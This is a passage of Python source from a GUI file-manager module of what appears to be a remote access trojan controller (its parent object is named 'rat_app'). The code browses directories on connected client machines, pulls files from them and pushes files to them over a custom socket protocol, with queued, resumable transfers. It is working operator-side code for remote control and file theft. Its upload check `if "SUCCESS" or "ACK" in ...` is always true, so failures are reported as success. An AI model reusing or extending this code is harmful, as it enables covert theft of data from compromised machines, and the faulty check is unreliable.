            self.save_transfer_states()
            
            # Final update to progress UI
            self.file_frame.after(0, lambda b=bytes_sent, t=file_size, s=start_time: 
                            self.update_progress(b, t, s))
            
            if self.stop_transfer:
                self.rat_app.current_client_socket.send(b"CANCEL")
                self.rat_app.log("File upload cancelled but can be resumed later")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Cancelled (Resumable)"))
                
                # Update history with cancellation
                self.current_transfer['status'] = "Cancelled"
                self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                self.add_to_history(self.current_transfer, "Cancelled")
            else:
                # Get final confirmation
                try:
                    self.rat_app.current_client_socket.settimeout(15)  # Increased timeout to 15 seconds
                    final_response = self.rat_app.current_client_socket.recv(1024).decode()
                    self.rat_app.log(f"Final response: {final_response}")
                    
                    # Modified to accept "SUCCESS" as substring
                    if "SUCCESS" or "ACK" in final_response:
                        elapsed_time = time.time() - start_time
                        self.rat_app.log(f"File uploaded successfully to {full_dest_path}")
                        self.file_frame.after(0, lambda: self.status_value.configure(text="Upload Complete"))
                        
                        # Update history with success
                        self.current_transfer['status'] = "Complete"
                        self.current_transfer['duration'] = f"{int(elapsed_time)}s"
                        self.add_to_history(self.current_transfer, "Complete")
                        
                        # Clear transfer state on success
                        if transfer_id in self.transfer_states:
                            del self.transfer_states[transfer_id]
                            self.save_transfer_states()
                        
                        # Show success notification
                        self.file_frame.after(0, lambda: self.show_toast_notification(
                            f"Upload Complete: {file_name}"))
                    else:
                        self.rat_app.log(f"Upload failed: {final_response}")
                        self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {final_response}"))
                        
                        # Update history with failure
                        self.current_transfer['status'] = "Failed"
                        self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                        self.add_to_history(self.current_transfer, "Failed")
                except socket.timeout:
                    self.rat_app.log("Timeout waiting for final confirmation")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Warning: No final confirmation"))
                finally:
                    self.rat_app.current_client_socket.settimeout(None)
        
        except Exception as e:
            self.rat_app.log(f"Upload error: {e}")
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {str(e)}"))
            
            # Update history with error
            if hasattr(self, 'current_transfer') and self.current_transfer:
                self.current_transfer['status'] = "Failed"
                self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                self.add_to_history(self.current_transfer, "Failed")
        
        finally:
            # Ensure we restore UI state
            self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
            
            # Reset current transfer
            self.current_transfer = None
            
            # Process next item in queue if available
            if hasattr(self, 'queue_items') and self.queue_items:
                # Ask if user wants to continue with queue
                self.file_frame.after(0, lambda: self.ask_process_queue())
                    
    def ask_process_queue(self):
        """Ask user if they want to process the next queue item."""
        if not hasattr(self, 'queue_items') or not self.queue_items:
            return
            
        queue_count = len(self.queue_items)
        response = messagebox.askyesno("Continue Queue Processing", 
                                     f"Process next item? ({queue_count} remaining in queue)")
        if response:
            # Process next item
            next_item = self.queue_items[0]
            self.queue_items.pop(0)
            self.update_queue_display()
            
            if next_item['type'] == 'Upload':
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.upload_file_thread, 
                               args=(next_item['source'], os.path.dirname(next_item['destination'])), 
                               daemon=True).start()
            elif next_item['type'] == 'Download':
                self.update_ui_for_transfer(True)
                self.stop_transfer = False
                threading.Thread(target=self.download_file_thread, 
                               args=(next_item['source'], os.path.dirname(next_item['destination'])), 
                               daemon=True).start()

    def list_remote_files(self):
        """List files from the remote system with enhanced display and sorting."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "No client connected")
            return
        
        remote_path = self.remote_path_entry.get()
        if not remote_path:
            messagebox.showinfo("No Path", "Enter a remote path to list files")
            return
        
        # Update client info label
        for addr, (client_id, conn) in self.rat_app.clients.items():
            if conn == self.rat_app.current_client_socket:
                self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                self.connection_status.configure(text="●", text_color="#00AA00")
                break
        
        # Show loading indicator
        if hasattr(self, 'files_tree'):
            # Clear existing items
            for item in self.files_tree.get_children():
                self.files_tree.delete(item)
                
            # Add loading indicator
            self.files_tree.insert("", "end", values=("Loading...", "", "", ""))
            
        # Update status
        self.status_value.configure(text=f"Listing: {remote_path}")
        
        # Start file listing in a thread
        threading.Thread(target=self.list_remote_files_thread, args=(remote_path,), daemon=True).start()
    
    def list_remote_files_thread(self, remote_path):
        """Thread function to list remote files with enhanced error handling."""
        try:
            # Send command to list files
            command = f"FILE_LIST|{remote_path}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Set timeout for response
            self.rat_app.current_client_socket.settimeout(30)  # 30 second timeout for large directories
            
            try:
                # Get response size
                size_data = self.rat_app.current_client_socket.recv(8)
                
                # Check if this is an error message
                if size_data.startswith(b"ERROR"):
                    error_msg = size_data + self.rat_app.current_client_socket.recv(1024)
                    self.rat_app.log(f"List files error: {error_msg.decode('utf-8', errors='replace')}")
                    self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", error_msg.decode('utf-8', errors='replace')))
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                    return
                
                response_size = struct.unpack('Q', size_data)[0]
                
                # Receive file listing data
                data = b""
                while len(data) < response_size:
                    chunk_size = min(response_size - len(data), self.CHUNK_SIZE)
                    chunk = self.rat_app.current_client_socket.recv(chunk_size)
                    if not chunk:
                        break
                    data += chunk
                
                # Reset timeout
                self.rat_app.current_client_socket.settimeout(None)
                
                file_list = data.decode('utf-8', errors='replace')
                
                # Check for error
                if file_list.startswith("ERROR:"):
                    self.rat_app.log(file_list)
                    self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", file_list))
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                    return
                
                # Clear existing items
                self.file_frame.after(0, lambda: self.clear_file_tree())
                
                # Parse and prepare files for display
                files = []
                directories = []
                
                file_entries = file_list.split('\n')
                for file_info in file_entries:
                    if not file_info.strip():
                        continue
                        
                    parts = file_info.split('|')
                    if len(parts) >= 4:
                        name, size, file_type, modified = parts[:4]
                        
                        # Skip hidden files unless show_hidden is enabled
                        if not self.show_hidden_files and name.startswith('.'):
                            continue
                            
                        # Separate directories and files
                        if file_type.lower() == "folder" or file_type.lower() == "directory":
                            directories.append((name, size, file_type, modified))
                        else:
                            files.append((name, size, file_type, modified))
                
                # Store original data for filtering
                self.original_file_data = directories + files
                
                # Display the files in the UI thread
                self.file_frame.after(0, lambda d=directories, f=files: self.display_remote_files(d, f))
            
            except socket.timeout:
                self.rat_app.log("Timeout while listing files")
                self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", "Timeout while listing files"))
                self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                
            except struct.error:
                self.rat_app.log("Invalid size data received")
                self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", "Invalid data format"))
                self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
                
        except Exception as e:
            self.rat_app.log(f"Error listing files: {e}")
            self.file_frame.after(0, lambda: messagebox.showerror("Listing Error", f"Error: {e}"))
            self.file_frame.after(0, lambda: self.status_value.configure(text="Idle"))
        finally:
            # Reset timeout
            try:
                self.rat_app.current_client_socket.settimeout(None)
            except:
                pass
    
    def clear_file_tree(self):
        """Clear the file tree."""
        if hasattr(self, 'files_tree'):
            for item in self.files_tree.get_children():
                self.files_tree.delete(item)
    
    def display_remote_files(self, directories, files):
        """Display remote files and directories in the treeview."""
        try:
            # Apply current filter if any
            filter_text = ""
            if hasattr(self, 'filter_entry'):
                filter_text = self.filter_entry.get().lower()
            
            # Display directories first
            for dir_info in directories:
                name, size, file_type, modified = dir_info
                
                # Apply filter if set
                if filter_text and filter_text not in name.lower():
                    continue
                    
                self.files_tree.insert("", "end", values=(name, size, file_type, modified))
            
            # Then display files
            for file_info in files:
                name, size, file_type, modified = file_info
                
                # Apply filter if set
                if filter_text and filter_text not in name.lower():
                    continue
                    
                self.files_tree.insert("", "end", values=(name, size, file_type, modified))
            
            # Update file count
            total_items = len(self.files_tree.get_children())
            if hasattr(self, 'file_count_label'):
                self.file_count_label.configure(text=f"{total_items} {'item' if total_items == 1 else 'items'}")
            
            # Update status
            self.status_value.configure(text="Idle")
            
            # Apply current sort if any
            if hasattr(self, 'current_sort_column'):
                self.sort_treeview(self.files_tree, self.current_sort_column)
                
        except Exception as e:
            self.rat_app.log(f"Error displaying files: {e}")
    
    def select_remote_file(self, event):
        """Handle double-click on remote file."""
        selection = self.files_tree.selection()
        if not selection:
            return
            
        item = self.files_tree.item(selection[0])
        values = item["values"]
        
        # Get the file name and type
        file_name = values[0]
        file_type = values[2] if len(values) > 2 else ""
        
        # If it's a directory, navigate into it
        if file_type.lower() == "folder" or file_type.lower() == "directory":
            current_path = self.remote_path_entry.get()
            
            # Ensure path ends with separator
            if not current_path.endswith('\\') and not current_path.endswith('/'):
                if '\\' in current_path:
                    current_path += '\\'
                else:
                    current_path += '/'
                    
            # Navigate to the directory
            new_path = current_path + file_name
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, new_path)
            
            # List files in the new directory
            self.list_remote_files()
        else:
            # File selected, prepare for download
            current_path = self.remote_path_entry.get()
            
            # Ensure path ends with separator
            if not current_path.endswith('\\') and not current_path.endswith('/'):
                if '\\' in current_path:
                    current_path += '\\'
                else:
                    current_path += '/'
                    
            # Update remote path entry with full file path
            full_path = current_path + file_name
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, full_path)
    
    # File download functionality with improved progress tracking and error handling
    def download_file(self):
        """Download selected file(s) from remote system."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "No client connected")
            return
        
        # Get selected items
        selection = self.files_tree.selection()
        if not selection:
            # If no selection but a path is in the entry, use that
            remote_file = self.remote_path_entry.get()
            if not remote_file:
                messagebox.showinfo("No Selection", "Select a file to download")
                return
                
            # Check if the path looks like a file (not ending with / or \)
            if remote_file.endswith('/') or remote_file.endswith('\\'):
                messagebox.showinfo("Not a File", "Select a file to download")
                return
        else:
            # Get the selected file(s)
            files_to_download = []
            
            for item_id in selection:
                item = self.files_tree.item(item_id)
                values = item["values"]
                
                file_name = values[0]
                file_type = values[2] if len(values) > 2 else ""
                
                # Skip directories for now
                if file_type.lower() == "folder" or file_type.lower() == "directory":
                    continue
                    
                # Get current path
                current_path = self.remote_path_entry.get()
                
                # Ensure path ends with separator
                if not current_path.endswith('\\') and not current_path.endswith('/'):
                    if '\\' in current_path:
                        current_path += '\\'
                    else:
                        current_path += '/'
                        
                # Add to download list
                files_to_download.append(current_path + file_name)
            
            if not files_to_download:
                messagebox.showinfo("No Files", "No files selected for download")
                return
                
            # Set the remote file to the first one
            remote_file = files_to_download[0]
            
            # Queue the rest if there are more
            if len(files_to_download) > 1:
                self.queue_additional_downloads(files_to_download[1:])
        
        # Get destination directory
        local_dest = self.download_dest_entry.get()
        if not local_dest:
            local_dest = filedialog.askdirectory(title="Select Download Destination")
            if not local_dest:
                return
                
            self.download_dest_entry.delete(0, tk.END)
            self.download_dest_entry.insert(0, local_dest)
        
        # Update client info label
        for addr, (client_id, conn) in self.rat_app.clients.items():
            if conn == self.rat_app.current_client_socket:
                self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                break
        
        # Start download
        self.update_ui_for_transfer(True)
        self.stop_transfer = False
        threading.Thread(target=self.download_file_thread, args=(remote_file, local_dest), daemon=True).start()
    
    def queue_additional_downloads(self, file_paths):
        """Add additional files to the download queue."""
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Get destination directory
        local_dest = self.download_dest_entry.get()
        if not local_dest:
            return
            
        # Get current priority setting
        priority = self.priority_var.get() if hasattr(self, 'priority_var') else "Normal"
        
        # Add each file to queue
        for file_path in file_paths:
            file_name = os.path.basename(file_path)
            
            # Add to queue
            queue_item = {
                'type': 'Download',
                'source': file_path,
                'destination': os.path.join(local_dest, file_name),
                'size': "Unknown",  # Size will be determined during download
                'priority': priority,
                'status': 'Pending',
                'added_time': time.time()
            }
            
            self.queue_items.append(queue_item)
        
        # Update queue display
        self.update_queue_display()
        
        # Show feedback
        count = len(file_paths)
        self.rat_app.log(f"Added {count} files to download queue")
        
        # Notify user
        self.show_toast_notification(f"Added {count} files to download queue")
    
    def download_file_thread(self, remote_file, local_dest):
        """Thread function to download a file with progress tracking."""
        
        if not hasattr(self, 'is_paused'):
            self.is_paused = False
            
        try:
            # Record start time for performance metrics
            start_time = time.time()
            
            # Get file name from path
            file_name = os.path.basename(remote_file)
            
            # Generate a unique transfer ID
            transfer_id = f"DN_{int(start_time)}_{file_name}"
            
            # Create current transfer record
            self.current_transfer = {
                'type': 'Download',
                'source': remote_file,
                'destination': os.path.join(local_dest, file_name),
                'size': "Unknown",  # Will be updated once we know
                'status': 'In Progress',
                'start_time': start_time
            }
            
            # Ensure destination is a directory
            if not os.path.isdir(local_dest):
                try:
                    os.makedirs(local_dest)
                except Exception as e:
                    self.rat_app.log(f"Could not create directory: {local_dest}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Invalid destination"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    return
            
            # Ensure destination ends with a separator
            if not local_dest.endswith('\\') and not local_dest.endswith('/'):
                if os.name == 'nt':  # Windows
                    local_dest += '\\'
                else:
                    local_dest += '/'
                    
            local_file_path = local_dest + file_name
            
            # Check if file exists for resume
            resume_position = 0
            if os.path.exists(local_file_path) and transfer_id in self.transfer_states:
                resume_position = os.path.getsize(local_file_path)
                self.rat_app.log(f"Resuming download from position {resume_position}")
            
            # Update UI to show file being downloaded
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Downloading: {file_name}"))
            
            # Clear any stale data in the socket buffer before starting command
            try:
                self.rat_app.current_client_socket.settimeout(0.1)
                while True:
                    stale_data = self.rat_app.current_client_socket.recv(1024)
                    if not stale_data:
                        break
            except (socket.timeout, BlockingIOError):
                pass  # No data to read, which is expected
            finally:
                self.rat_app.current_client_socket.settimeout(None)
            
            # Send command to start/resume file download
            command = f"FILE_DOWNLOAD|{remote_file}|{resume_position}|{transfer_id}"
            self.rat_app.log(f"Sending download command: {command}")
            self.rat_app.current_client_socket.send(command.encode())
            
            # Get file size with timeout
            self.rat_app.current_client_socket.settimeout(15)  # 15 second timeout
            try:
                size_data = self.rat_app.current_client_socket.recv(8)
                if size_data == b"ERROR":
                    error_msg = self.rat_app.current_client_socket.recv(1024).decode()
                    self.rat_app.log(f"Download failed: {error_msg}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {error_msg}"))
                    self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                    
                    # Update history with failure
                    self.current_transfer['status'] = "Failed"
                    self.current_transfer['duration'] = "0s"
                    self.add_to_history(self.current_transfer, "Failed")
                    return
                    
                file_size = struct.unpack('Q', size_data)[0]
                self.rat_app.log(f"File size received: {file_size} bytes")
            except socket.timeout:
                self.rat_app.log("Timeout waiting for file size")
                self.file_frame.after(0, lambda: self.status_value.configure(text="Error: Connection timeout"))
                self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
                
                # Update history with failure
                self.current_transfer['status'] = "Failed"
                self.current_transfer['duration'] = "0s"
                self.add_to_history(self.current_transfer, "Failed")
                return
            finally:
                self.rat_app.current_client_socket.settimeout(None)  # Reset timeout
            
            # Update transfer info with size
            self.current_transfer['size'] = self.format_size(file_size)
            
            # Ready to receive
            self.rat_app.log("Sending READY signal")
            self.rat_app.current_client_socket.send(b"READY")
            
            # Update transfer state
            self.transfer_states[transfer_id] = {
                'type': 'download',
                'remote_file': remote_file,
                'local_file': local_file_path,
                'total_size': file_size,
                'position': resume_position,
                'start_time': start_time
            }
            
            # Save state immediately
            self.save_transfer_states()
            
            # Receive and save file
            with open(local_file_path, 'ab' if resume_position > 0 else 'wb') as f:
                bytes_received = resume_position
                self.file_frame.after(0, lambda: self.status_value.configure(text="Downloading..."))
                
                # For progress updates
                last_update_time = time.time()
                last_save_time = time.time()
                
                while bytes_received < file_size and not self.stop_transfer and not self.is_paused:
                    # Calculate remaining bytes and chunk size
                    remaining = file_size - bytes_received
                    chunk_size = min(remaining, self.CHUNK_SIZE)
                    
                    # Set timeout for receive operation
                    self.rat_app.current_client_socket.settimeout(30)  # 30 second timeout
                    
                    try:
                        chunk = self.rat_app.current_client_socket.recv(chunk_size)
                        self.rat_app.current_client_socket.settimeout(None)  # Reset timeout
                        
                        if not chunk:
                            self.rat_app.log("No data received, connection may be closed")
                            break
                            
                        if chunk == b"CANCEL":
                            self.rat_app.log("Download cancelled by client")
                            break
                        
                        f.write(chunk)
                        bytes_received += len(chunk)
                        
                        # Update progress (limit updates to avoid UI freezing)
                        current_time = time.time()
                        if current_time - last_update_time > 0.1:  # Update every 100ms
                            self.file_frame.after(0, lambda b=bytes_received, t=file_size, s=start_time: 
                                            self.update_progress(b, t, s))
                            last_update_time = current_time
                        
                        # Update transfer state periodically
                        if current_time - last_save_time > 2:  # Save every 2 seconds
                            self.transfer_states[transfer_id]['position'] = bytes_received
                            self.save_transfer_states()
                            last_save_time = current_time
                        
                        # Handle pause
                        while self.is_paused and not self.stop_transfer:
                            time.sleep(0.5)  # Sleep briefly while paused
                        
                        # Send acknowledgment for flow control (exactly "ACK")
                        self.rat_app.log(f"Sending ACK for {len(chunk)} bytes")
                        self.rat_app.current_client_socket.send(b"ACK")
                        
                    except socket.timeout:
                        self.rat_app.log("Timeout while receiving data")
                        # Update transfer state for potential resume
                        self.transfer_states[transfer_id]['position'] = bytes_received
                        self.save_transfer_states()
                        raise Exception("Connection timeout during download")
                        
                    except Exception as e:
                        self.rat_app.log(f"Error receiving data: {e}")
                        # Update transfer state for potential resume
                        self.transfer_states[transfer_id]['position'] = bytes_received
                        self.save_transfer_states()
                        raise
                
                # Final update to transfer state
                self.transfer_states[transfer_id]['position'] = bytes_received
                self.save_transfer_states()
                
                # Final update to progress UI
                self.file_frame.after(0, lambda b=bytes_received, t=file_size, s=start_time: 
                                self.update_progress(b, t, s))
                
                if self.stop_transfer:
                    self.rat_app.current_client_socket.send(b"CANCEL")
                    self.rat_app.log("File download cancelled but can be resumed later")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Cancelled (Resumable)"))
                    
                    # Update history with cancellation
                    self.current_transfer['status'] = "Cancelled"
                    self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                    self.add_to_history(self.current_transfer, "Cancelled")
                else:
                    elapsed_time = time.time() - start_time
                    # Send success confirmation to client (exactly "SUCCESS")
                    self.rat_app.log("Sending SUCCESS signal")
                    self.rat_app.current_client_socket.send(b"SUCCESS")
                    self.rat_app.log(f"File downloaded successfully to {local_file_path}")
                    self.file_frame.after(0, lambda: self.status_value.configure(text="Download Complete"))
                    
                    # Update history with success
                    self.current_transfer['status'] = "Complete"
                    self.current_transfer['duration'] = f"{int(elapsed_time)}s"
                    self.add_to_history(self.current_transfer, "Complete")
                    
                    # Clear transfer state on success
                    if transfer_id in self.transfer_states:
                        del self.transfer_states[transfer_id]
                        self.save_transfer_states()
                    
                    # Show success notification
                    self.file_frame.after(0, lambda: self.show_toast_notification(
                        f"Download Complete: {file_name}"))
            
        except Exception as e:
            self.rat_app.log(f"Download error: {e}")
            self.file_frame.after(0, lambda: self.status_value.configure(text=f"Error: {str(e)}"))
            
            # Update history with error
            if hasattr(self, 'current_transfer') and self.current_transfer:
                self.current_transfer['status'] = "Failed"
                self.current_transfer['duration'] = f"{int(time.time() - start_time)}s"
                self.add_to_history(self.current_transfer, "Failed")
        
        finally:
            # Ensure timeout is reset
            try:
                self.rat_app.current_client_socket.settimeout(None)
            except:
                pass
                
            # Ensure we restore UI state
            self.file_frame.after(0, lambda: self.update_ui_for_transfer(False))
            
            # Reset current transfer
            self.current_transfer = None
            
            # Process next item in queue if available
            if hasattr(self, 'queue_items') and self.queue_items:
                # Ask if user wants to continue with queue
                self.file_frame.after(0, lambda: self.ask_process_queue())
    
    def show_resume_dialog(self):
        """Show a dialog to select which transfer to resume."""
        resumable = self.get_resumable_transfers()
        
        if not resumable:
            messagebox.showinfo("No Transfers", "No resumable transfers available")
            return
            
        # Create dialog
        theme = self.get_theme_colors()
        dialog = ctk.CTkToplevel(self.file_frame)
        dialog.title("Resume Transfer")
        dialog.geometry("500x300")
        dialog.grab_set()
        
        # Create list frame with modern styling
        list_frame = ctk.CTkFrame(dialog, fg_color=theme["card_color"],
                              corner_radius=10)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title with icon
        title_label = ctk.CTkLabel(list_frame, text="🔄 Resume Interrupted Transfer", 
                               font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                              size=FONT_STYLES["subheading"][1], 
                                              weight=FONT_STYLES["subheading"][2]))
        title_label.pack(anchor="w", padx=15, pady=(10, 15))
        
        # Create styled listbox for transfers
        list_container = ctk.CTkFrame(list_frame, fg_color=theme["bg_color"])
        list_container.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
        
        listbox = tk.Listbox(list_container, bg=theme["bg_color"], fg=theme["fg_color"], 
                         selectbackground=theme["accent_color"], height=10,
                         font=ctk.CTkFont(size=12))
        listbox.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
        
        # Add scrollbar
        scrollbar = tk.Scrollbar(listbox, orient="vertical", command=listbox.yview)
        listbox.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Add transfers to listbox with detailed info
        for i, transfer in enumerate(resumable):
            display_text = f"{transfer['type'].upper()}: {transfer['file']} - {transfer['progress']} completed"
            listbox.insert(tk.END, display_text)
        
        # Info section
        info_text = ctk.CTkLabel(list_frame, text="Select a transfer to resume. Progress will continue from where it was interrupted.",
                             font=ctk.CTkFont(size=11),
                             text_color=theme["fg_color"])
        info_text.pack(pady=(0, 10), padx=15)
        
        # Select first item
        if resumable:
            listbox.selection_set(0)
        
        # Create buttons with modern styling
        button_frame = ctk.CTkFrame(dialog, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=10, pady=10)
        
        resume_btn = ctk.CTkButton(button_frame, text="Resume Selected", 
                               command=lambda: self.resume_selected_transfer(
                                   resumable[listbox.curselection()[0]] if listbox.curselection() else None, 
                                   dialog),
                               fg_color=theme["accent_color"],
                               hover_color=theme["hover_color"],
                               height=36,
                               corner_radius=8)
        resume_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        
        cancel_btn = ctk.CTkButton(button_frame, text="Cancel", 
                               command=dialog.destroy,
                               fg_color=theme["button_color"],
                               hover_color=theme["hover_color"],
                               height=36,
                               corner_radius=8)
        cancel_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
    
    def resume_selected_transfer(self, transfer_info, dialog):
        """Resume the selected transfer and close the dialog."""
        dialog.destroy()
        
        if not transfer_info:
            return
            
        transfer_id = transfer_info['id']
        state = self.transfer_states[transfer_id]
        
        # Resume based on transfer type
        if state['type'] == 'upload':
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.is_paused = False
            threading.Thread(
                target=self.upload_file_thread, 
                args=(state['file_path'], os.path.dirname(state['dest_path'])),
                daemon=True
            ).start()
        else:  # download
            self.update_ui_for_transfer(True)
            self.stop_transfer = False
            self.is_paused = False
            threading.Thread(
                target=self.download_file_thread, 
                args=(state['remote_file'], os.path.dirname(state['local_file'])),
                daemon=True
            ).start()
    
    def get_resumable_transfers(self):
        """Get a list of resumable transfers with readable info."""
        resumable = []
        
        if not hasattr(self, 'transfer_states'):
            return resumable
            
        for transfer_id, state in self.transfer_states.items():
            valid, reason = self.validate_transfer_state(transfer_id)
            if valid:
                # Extract file name
                if state['type'] == 'upload':
                    file_name = os.path.basename(state['file_path'])
                else:
                    file_name = os.path.basename(state['remote_file'])
                    
                # Calculate progress
                progress = (state['position'] / state['total_size']) * 100
                
                resumable.append({
                    'id': transfer_id,
                    'type': state['type'],
                    'file': file_name,
                    'progress': f"{progress:.1f}%",
                    'time': time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(state['start_time']))
                })
        
        return resumable
    
    def validate_transfer_state(self, transfer_id):
        """Validate that a transfer state is valid and can be resumed."""
        if not hasattr(self, 'transfer_states') or transfer_id not in self.transfer_states:
            return False, "No saved state found"
            
        state = self.transfer_states[transfer_id]
        
        if state['type'] == 'upload':
            # Check that source file exists and is the right size
            if not os.path.exists(state['file_path']):
                return False, "Source file no longer exists"
                
            current_size = os.path.getsize(state['file_path'])
            if current_size != state['total_size']:
                return False, "Source file has changed size"
                
        elif state['type'] == 'download':
            # Check that local file exists if we're supposed to resume
            if state['position'] > 0 and not os.path.exists(state['local_file']):
                return False, "Local file missing for resume"
                
        return True, "OK"
    
    def save_transfer_states(self):
        """Save transfer states to a file with enhanced error handling."""
        if not hasattr(self, 'transfer_states'):
            return
            
        try:
            with open("transfer_states.json", "w") as f:
                # Convert complex objects to serializable format
                serializable_states = {}
                for transfer_id, state in self.transfer_states.items():
                    serializable_states[transfer_id] = {
                        'type': state['type'],
                        'total_size': state['total_size'],
                        'position': state['position'],
                        'start_time': state['start_time']
                    }
                    
                    if state['type'] == 'upload':
                        serializable_states[transfer_id]['file_path'] = state['file_path']
                        serializable_states[transfer_id]['dest_path'] = state['dest_path']
                    else:  # download
                        serializable_states[transfer_id]['remote_file'] = state['remote_file']
                        serializable_states[transfer_id]['local_file'] = state['local_file']
                
                json.dump(serializable_states, f)
        except Exception as e:
            self.rat_app.log(f"Error saving transfer states: {e}")

    def load_transfer_states(self):
        """Load transfer states from a file with enhanced error handling."""
        try:
            self.transfer_states = {}
            
            if os.path.exists("transfer_states.json"):
                with open("transfer_states.json", "r") as f:
                    try:
                        loaded_states = json.load(f)
                        
                        # Validate loaded data
                        if isinstance(loaded_states, dict):
                            self.transfer_states = loaded_states
                            
                            # Update UI to enable resume button if needed
                            if self.transfer_states and hasattr(self, 'resume_btn'):
                                self.resume_btn.configure(state="normal")
                    except json.JSONDecodeError:
                        self.rat_app.log("Error parsing transfer states file - corrupted JSON")
        except Exception as e:
            self.rat_app.log(f"Error loading transfer states: {e}")
    
    def update_client_info(self):
        """Update the client info when a client is selected."""
        if not hasattr(self, 'client_info_label'):
            return
            
        if self.rat_app.current_client_socket:
            for addr, (client_id, conn) in self.rat_app.clients.items():
                if conn == self.rat_app.current_client_socket:
                    self.client_info_label.configure(text=f"{addr[0]}:{addr[1]}")
                    self.connection_status.configure(text="●", text_color="#00AA00")
                    return
        
        self.client_info_label.configure(text="None")
        self.connection_status.configure(text="●", text_color="#FF5555")
    
    #--------------------------------------------------------
    # Drag and Drop Support
    #--------------------------------------------------------
    
    def setup_drag_drop(self):
        """Setup drag and drop functionality for file uploads."""
        try:
            # Only import if available (not all Python installations have this)
            import tkinterdnd2 as tkdnd
            
            # Enable drag and drop for the upload file entry
            if hasattr(self, 'upload_file_entry'):
                tkdnd.register_drop_target(self.upload_file_entry, "DND_Files")
                self.upload_file_entry.dnd_bind('<<Drop>>', self.on_drop_upload)
                
            # Enable drag and drop for the upload info text area
            if hasattr(self, 'upload_info_text'):
                tkdnd.register_drop_target(self.upload_info_text, "DND_Files")
                self.upload_info_text.dnd_bind('<<Drop>>', self.on_drop_upload)
                
            # Enable drag and drop for the entire upload frame
            if hasattr(self, 'upload_frame'):
                tkdnd.register_drop_target(self.upload_frame, "DND_Files")
                self.upload_frame.dnd_bind('<<Drop>>', self.on_drop_upload)
                
        except ImportError:
            # Drag and drop not available, just log it
            self.rat_app.log("Drag and drop support not available (tkinterdnd2 not installed)")
    
    def on_drop_upload(self, event):
        """Handle dropped files for upload."""
        file_paths = event.data
        
        # Handle different formats (Windows vs Unix)
        if '{' in file_paths:
            # Windows format: {C:/path/to/file1} {C:/path/to/file2}
            file_paths = file_paths.strip('{}').split('} {')
        else:
            # Unix format: file:///path/to/file
            file_paths = [file_paths.replace('file://', '')]
            
        # Clean up paths
        cleaned_paths = []
        for path in file_paths:
            # Remove URL encoding
            path = path.replace('%20', ' ')
            # Remove trailing spaces
            path = path.strip()
            # Add to list if valid
            if os.path.exists(path):
                cleaned_paths.append(path)
        
        if not cleaned_paths:
            return
            
        # Update UI based on single or multiple files
        if len(cleaned_paths) == 1:
            # Single file
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, cleaned_paths[0])
            self.selected_files = cleaned_paths
            self.update_file_info(cleaned_paths[0])
            
            # Set single file mode
            if hasattr(self, 'multiple_files_var'):
                self.multiple_files_var.set(False)
                self.toggle_multiple_files_mode()
        else:
            # Multiple files
            self.upload_file_entry.delete(0, tk.END)
            self.upload_file_entry.insert(0, f"{len(cleaned_paths)} files selected")
            self.selected_files = cleaned_paths
            self.update_multifile_info(cleaned_paths)
            
            # Set multiple files mode
            if hasattr(self, 'multiple_files_var'):
                self.multiple_files_var.set(True)
                self.toggle_multiple_files_mode()
    
    #--------------------------------------------------------
    # Enhanced Keyboard Shortcuts
    #--------------------------------------------------------
    
    def setup_keyboard_shortcuts(self):
        """Setup keyboard shortcuts for common operations."""
        # Bind to the main file frame
        if hasattr(self, 'file_frame'):
            # Upload shortcuts
            self.file_frame.bind("<Control-u>", lambda e: self.upload_file())
            
            # Download shortcuts
            self.file_frame.bind("<Control-d>", lambda e: self.download_file())
            
            # Navigation shortcuts
            self.file_frame.bind("<Alt-Up>", lambda e: self.navigate_back())
            self.file_frame.bind("<F5>", lambda e: self.list_remote_files())
            
            # Cancel shortcuts
            self.file_frame.bind("<Escape>", lambda e: self.cancel_transfer())
            
            # Tab shortcuts
            self.file_frame.bind("<Control-1>", lambda e: self.transfer_notebook.select(0))  # Upload tab
